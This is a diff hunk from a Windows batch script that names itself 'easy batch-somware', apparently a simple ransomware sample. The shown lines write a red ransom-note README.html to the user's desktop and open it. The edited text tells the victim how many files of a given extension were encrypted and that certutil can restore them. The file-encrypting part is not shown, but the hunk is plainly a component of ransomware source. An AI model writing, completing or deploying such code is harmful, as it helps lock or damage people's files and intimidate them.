@@ -40,8 +40,8 @@ if %cnt% NEQ 0 (
 	echo ^<html^>^<head^>^<title^>RSM.MSG^</title^> ^<style^> #texto2{padding-top: 2%; letter-spacing: 2px; text-align: center;}^</style^>^</head^> > "%userprofile%\Desktop\README.html"
 	echo ^<body bgcolor="#FF3333" scroll="no"^> ^<font face="Lucida Console" size="4" color="white"^> ^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
 	echo ^<center^>^<p^> - easy batch-somware - ^</p^>^</center^> ^<div id="texto2"^> ^<img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100"^> >> "%userprofile%\Desktop\README.html"
-	echo ^<br^>^<br^>^<br^> Oh, my. It looks like your files have been encrypted!^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
-	echo Not cool, but you can reverse it using "certutil", so be careful next time! ^</body^>^</html^> >> "%userprofile%\Desktop\README.html"
+	echo ^<br^>^<br^>^<br^> Oh, my. It looks like %cnt% of your files were encrypted!^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
+	echo Not cool, but you can restore your %fileExtension% files using "certutil". ^<br^>^<br^> Be careful next time! ^</body^>^</html^> >> "%userprofile%\Desktop\README.html"
 	start "" "%userprofile%\Desktop\README.html"
 ) else (
    echo no files have been encrypted, exiting
